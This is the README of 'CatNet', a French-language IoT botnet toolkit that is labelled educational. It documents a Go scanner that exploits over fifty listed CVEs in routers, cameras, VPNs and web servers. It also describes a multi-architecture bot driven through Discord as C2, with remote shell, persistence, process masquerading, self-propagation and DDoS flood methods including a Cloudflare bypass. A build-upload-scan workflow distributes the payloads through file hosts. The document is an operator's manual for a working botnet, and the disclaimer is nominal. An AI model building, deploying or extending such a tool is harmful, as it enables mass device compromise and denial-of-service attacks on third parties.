```
   ██████╗ █████╗ ████████╗███╗   ██╗███████╗████████╗
  ██╔════╝██╔══██╗╚══██╔══╝████╗  ██║██╔════╝╚══██╔══╝
  ██║     ███████║   ██║   ██╔██╗ ██║█████╗     ██║
  ██║     ██╔══██║   ██║   ██║╚██╗██║██╔══╝     ██║
  ╚██████╗██║  ██║   ██║   ██║ ╚████║███████╗   ██║
   ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝
```

```
      /\_/\
     ( o.o )  ~ nyaa ~
      > ^ <
     /|   |\
    (_|   |_)
```

# CatNet

**`[ BY CAT-PROJECT-HAT // v2.0 // 2026 ]`**

*Scanner IoT educatif — Multi-archi — MikroTik — Mēris Takeover*

![Python](https://img.shields.io/badge/Python-3.10+-green?style=for-the-badge&logo=python&logoColor=white)
![Go](https://img.shields.io/badge/Scanner-Go-00ADD8?style=for-the-badge&logo=go&logoColor=white)
![Platform](https://img.shields.io/badge/Target-IoT%2FLinux-FF6B35?style=for-the-badge)
![Arch](https://img.shields.io/badge/Arch-MIPS%20%7C%20ARM%20%7C%20x86-blueviolet?style=for-the-badge)
![License](https://img.shields.io/badge/License-Educational-red?style=for-the-badge)

---

## ⚠️ Avertissement

> Ce projet est **strictement éducatif**. L'utilisation sur des systèmes sans autorisation explicite est **illégale**. Les auteurs déclinent toute responsabilité en cas d'utilisation abusive.

---

## 🗂️ Structure

```
catnet/
├── main.py          ← Menu TUI interactif — compilation, upload, orchestration
├── fiber.go         ← Scanner Go — exploitation, brute-force, propagation
├── bot_discord.go   ← Agent déployé sur cibles (multi-archi)
└── builds/          ← Binaires compilés (auto-généré)
```

---

## ⚡ Fonctionnalités

| Module | Description |
|:------:|-------------|
| 🔍 **Scanner** | Scan réseau multi-port, goroutines parallèles, timeouts adaptatifs |
| 🤖 **Bot multi-archi** | MIPS · MIPSLE · ARM · ARM64 · x86 · x86\_64 · PPC · SH4 · M68K · SPARC |
| ☁️ **Upload auto** | catbox.moe / transfer.sh / 0x0.st / serveur perso — URLs embarquées au build |
| 🖥️ **Orchestration** | Sessions `screen`, scan par plages IP ou liste, jobs arrière-plan |
| 📡 **MikroTik** | CVE-2018-14847 · Brute API 8728 · SSH · Mēris SOCKS5 takeover |
| 💥 **Exploits** | 50+ CVEs couvrant routeurs, caméras, VPN, serveurs web, switches |
| 📊 **Log viewer** | Vue live scanner, cibles, imports, IDB — menu `[t]` |

---

## 💬 Commandes du bot (Discord C2)

Le bot répond à `!<botID> <cmd>` ou `!all <cmd>` pour cibler tous les bots.

| Commande | Description |
|----------|-------------|
| `!all shell <cmd>` | Exécute une commande shell et retourne le résultat |
| `!all info` | Infos système : arch, OS, kernel, user, CPU, RAM, IP |
| `!all persist` | Installe la persistance (cron, rc.local, init.d) |
| `!all spread [port] [workers]` | Lance la propagation automatique (zmap ou TCP natif) |
| `!all spread stop` | Stoppe la propagation |
| `!all ddos <ip> <port> <sec> [METHOD] [workers]` | Lance une attaque DDoS |
| `!all ddos methods` | Liste toutes les méthodes DDoS disponibles |
| `!all ddos stop` | Stoppe l'attaque en cours |
| `!all update <url>` | Met à jour le binaire depuis une URL |
| `!all kill` | Termine le bot |
| `!all help` | Affiche l'aide |

### Méthodes DDoS

| Méthode | Description |
|---------|-------------|
| `UDP` | UDP flood — raw packets |
| `TCP` | TCP connect flood |
| `HTTP` | HTTP GET flood |
| `POST` | HTTP POST flood |
| `HTTPS` | TLS/SSL handshake flood |
| `BYPASS` | Browser spoof — contournement Cloudflare |
| `SYN` | SYN flood |
| `SLOWLORIS` | Keepalive starvation |
| `RUDY` | R-U-Dead-Yet — slow POST |
| `DNS` | DNS query flood |
| `NTP` | NTP amplification ×4000 |
| `VSE` | Game server flood |
| `MIX` | Toutes les méthodes combinées |
| `AUTO` | Auto perf-scaled (recommandé) |

### Comportement du bot

- **selfHide** — copie sous un nom de processus système (`systemd-worker`, `kworker`, `syslogd`, `ntpd`...) et supprime l'original
- **pingBeacon** — ping silencieux du C2 au démarrage pour signaler la présence
- **spread** — propagation autonome via zmap si disponible, sinon TCP natif
- **persist** — injection dans cron, rc.local ou init.d selon ce qui est accessible

---

## 🎯 CVEs ciblés

### Routeurs & IoT

| CVE | Cible | Type |
|-----|-------|------|
| CVE-2018-14847 | MikroTik RouterOS < 6.42.1 (Winbox) | Path traversal → creds plaintext |
| CVE-2021-35395 | Realtek SDK (centaines de modèles) | RCE non authentifié |
| CVE-2021-35394 | Realtek Jungle SDK (UDPServer) | Command injection |
| CVE-2018-10561/10562 | GPON Dasan/Huawei | Bypass auth + RCE |
| CVE-2022-30525 | Zyxel USG/ATP/VPN firewall | RCE non authentifié |
| CVE-2017-18368 | ZyXEL P660HN-T1A | RCE non authentifié |
| CVE-2016-20016 | MVPower DVR | Shell RCE (Mirai variant) |
| CVE-2020-25506 | D-Link DNS-320 | RCE non authentifié |
| CVE-2020-10987 | Tenda AC15/AC18 | RCE via goform/setUsbUnload |
| CVE-2019-12780 | Belkin/Linksys N750/N900 | RCE via ping_target |
| CVE-2023-1389 | TP-Link Archer AX21 | Command injection |
| CVE-2024-12987 | DrayTek Vigor | Command injection non authentifié |
| CVE-2024-11237 | TP-Link VN020-F3v(T) | Stack overflow / command injection |
| CVE-2024-3721 | TP-Link Archer | Command injection via PPTP |
| CVE-2024-3080 | ASUS RT-AX/AC/N | Auth bypass + command injection |
| CVE-2019-1652/1653 | Cisco RV320/RV325 | Config dump + RCE |
| CVE-2023-20198 | Cisco IOS XE Web UI | Privilege escalation |
| CVE-2017-6334 | Netgear DGN2200/DGND3700 | RCE via dnslookup.cgi |
| CVE-2026-0625 | D-Link DSL/DIR/DNS | Command injection via dnscfg.cgi |
| CVE-2026-36540 | Netis AC1200 NC21 | Command injection pré-auth |
| CVE-2026-27849 | Linksys mesh | Command injection pré-auth |

### Caméras & DVR

| CVE | Cible | Type |
|-----|-------|------|
| CVE-2021-36260 | Hikvision (millions de caméras) | RCE non authentifié |
| CVE-2018-9995 | DVR TVT/HiSilicon | Bypass auth + RCE |
| CVE-2020-25078 | D-Link DCS series | Info leak + RCE |
| CVE-2024-7029 | AVTECH IP cameras | Command injection |
| CVE-2025-1316 | Edimax IC-7100 | OS command injection |
| CVE-2026-22755 | Vivotek IP Camera | Command injection via upload_map.cgi |
| CVE-2026-32649 | Milesight camera | Command injection pré-auth |

### VPN & Firewalls

| CVE | Cible | Type |
|-----|-------|------|
| CVE-2018-13379 | FortiGate SSL-VPN | Path traversal |
| CVE-2019-11510 | Pulse Secure VPN | File read pré-auth |
| CVE-2019-19781 | Citrix ADC / NetScaler | RCE pré-auth |
| CVE-2021-20016 | SonicWall SSLVPN | SQL injection → credentials |
| CVE-2021-22986 | F5 BIG-IP iControl REST | RCE non authentifié |
| CVE-2020-5902 | F5 BigIP TMUI | RCE |
| CVE-2020-12271 | Sophos XG Firewall | SQLi/RCE pré-auth |
| CVE-2024-9463 | Palo Alto Expedition | Command injection pré-auth |
| CVE-2024-11667 | Zyxel USG FLEX / ATP | Path traversal + command injection |
| CVE-2025-23006 | SonicWall SMA | OS command injection pré-auth |
| CVE-2025-0108 | Palo Alto PAN-OS | Auth bypass via path confusion |

### Serveurs web & frameworks

| CVE | Cible | Type |
|-----|-------|------|
| CVE-2021-41773/42013 | Apache httpd | Path traversal → RCE |
| CVE-2020-1938 | Apache Tomcat (Ghostcat) | AJP injection |
| CVE-2022-26134 | Confluence | OGNL injection RCE |
| CVE-2020-14882 | Oracle WebLogic | RCE |
| CVE-2021-41378 | Atlassian Jira | Expression Language injection |
| CVE-2021-22911 | Nextcloud | File upload RCE |
| CVE-2020-11738 | Shellshock CGI/Bash | Command injection |
| CVE-2022-22965 | Spring Framework (Spring4Shell) | RCE (JDK 9+) |
| CVE-2024-36401 | GeoServer | OGC eval injection |
| CVE-2024-4577 | PHP CGI | Argument injection |
| CVE-2024-21887 | Ivanti Connect Secure / CSA | Command injection pré-auth |
| CVE-2024-6387 | OpenSSH (regreSSHion) | RCE Linux glibc |

---

## 🔌 Ports scannés par défaut

```
┌────────┬──────────────────────────────┐
│  PORT  │  SERVICE                     │
├────────┼──────────────────────────────┤
│   23   │  Telnet                      │
│   80   │  HTTP                        │
│  443   │  HTTPS                       │
│  2000  │  MikroTik Bandwidth-Test     │
│  5000  │  UPnP                        │
│  5678  │  Mēris SOCKS5               │
│  7547  │  TR-069 / CWMP               │
│  8080  │  HTTP Alt                    │
│  8291  │  MikroTik Winbox             │
│  8443  │  HTTPS Alt                   │
│  8728  │  RouterOS API                │
│  9527  │  DVR / Caméras               │
│ 34567  │  DVR / Caméras               │
│ 37215  │  Huawei HG532                │
└────────┴──────────────────────────────┘
```

---

## 📦 Installation

> Le programme **ne gère pas les dépendances automatiquement**.

### 🐍 Python 3.10+
```bash
sudo apt update && sudo apt install -y python3 python3-pip
```

### 🐹 Go 1.21+ (obligatoire — version apt trop ancienne)
```bash
wget https://go.dev/dl/go1.22.4.linux-amd64.tar.gz
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf go1.22.4.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc && source ~/.bashrc
go version
```

### 🔒 garble — obfuscation Go (optionnel)
```bash
go install mvdan.cc/garble@latest
echo 'export PATH=$PATH:$(go env GOPATH)/bin' >> ~/.bashrc && source ~/.bashrc
```

### 🗺️ zmap
```bash
sudo apt install -y zmap
```

> **Raspberry Pi / ARM** — compiler depuis les sources :
> ```bash
> sudo apt install -y cmake libgmp-dev libpcap-dev libjson-c-dev libbytesize-dev
> git clone https://github.com/zmap/zmap.git && cd zmap
> mkdir build && cd build && cmake .. && make -j$(nproc) && sudo make install
> ```

### 🛠️ Outils de base
```bash
sudo apt install -y screen masscan curl
```

### 🔧 Compilateurs croisés (bot multi-archi)
```bash
sudo apt install -y \
  gcc-mips-linux-gnu gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu \
  gcc-powerpc-linux-gnu gcc-sh4-linux-gnu gcc-m68k-linux-gnu \
  gcc-sparc64-linux-gnu gcc-multilib libc6-dev-i386

# Fix erreur asm/socket.h
for arch in i386-linux-gnu mips-linux-gnu arm-linux-gnueabi aarch64-linux-gnu \
            powerpc-linux-gnu sh4-linux-gnu m68k-linux-gnu sparc64-linux-gnu; do
  sudo mkdir -p /usr/$arch/include
  sudo ln -sf /usr/include/asm-generic /usr/$arch/include/asm
done
```

---

## 🚀 Lancement

```bash
sudo python3 main.py
```
> Root requis pour zmap/masscan (raw sockets).

---

## 🔄 Flux de travail

```
[1] Services       →  configurer IP C2, port, mode distrib
[2] Compiler bot   →  compile bot_discord.go toutes archi
[3] Upload         →  upload binaires catbox.moe / serveur perso
[4] Compiler fiber →  scanner avec URLs bots embarquées
[5] Lancer scan    →  plage IP ou liste, choix ports
[t] Logs live      →  suivi en direct du scan
```

---

## ☁️ Distribution des binaires

| Mode | Description |
|------|-------------|
| `auto` | Upload catbox.moe / transfer.sh — aucune IP publique requise |
| `local` | fiber sert les fichiers — IP/port accessible depuis Internet |

**Serveur perso** → POST multipart `/upload.php` → `{"success":true,"url":"..."}`

---

## 🐛 Dépannage

**`garble: can't find Go toolchain`**
```bash
which go   # doit retourner /usr/local/go/bin/go
```

**`screen: command not found`**
```bash
sudo apt install -y screen
```

**`0 Attempted` après plusieurs minutes**
zmap n'a trouvé aucun host ouvert sur ce port. fiber attend stdin indéfiniment — tuer le screen, changer de plage ou de port.

**`asm/socket.h: No such file or directory`**
Symlinks asm-generic manquants — voir section compilateurs croisés.

**Bot ne s'exécute pas sur la cible**
`file bot.arm` pour vérifier l'archi. Utiliser `bot.mipsle` pour MIPS little-endian.

---

## Disclaimer

> **Ce projet est strictement educatif.** L'utilisation de cet outil sur des systemes sans autorisation explicite est illegale. Les auteurs ne sont pas responsables de toute utilisation abusive. Respectez la loi.

---

## Credits

**by cat-project-hat** *(we do the best for you)*

---

```
/\_/\
( o.o )   CATNET v2.0 // BY CAT-PROJECT-HAT // 2026
 > ^ <
```
